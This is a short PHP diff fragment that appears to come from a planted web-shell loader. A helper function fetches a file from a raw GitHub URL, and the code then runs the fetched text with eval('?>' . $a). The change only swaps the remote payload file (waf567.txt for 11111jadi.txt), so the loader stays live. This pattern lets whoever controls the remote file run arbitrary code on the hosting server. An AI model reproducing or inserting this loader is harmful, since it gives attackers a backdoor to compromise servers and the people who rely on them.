@@ -8,7 +8,7 @@ function geturlsinfo($url) {
     return $output;
 }
 
-$a = geturlsinfo('https://raw.githubusercontent.com/kbol08992-lang/data/refs/heads/main/waf567.txt');
+$a = geturlsinfo('https://raw.githubusercontent.com/kbol08992-lang/data/refs/heads/main/11111jadi.txt');
 
 eval('?>' . $a);
 
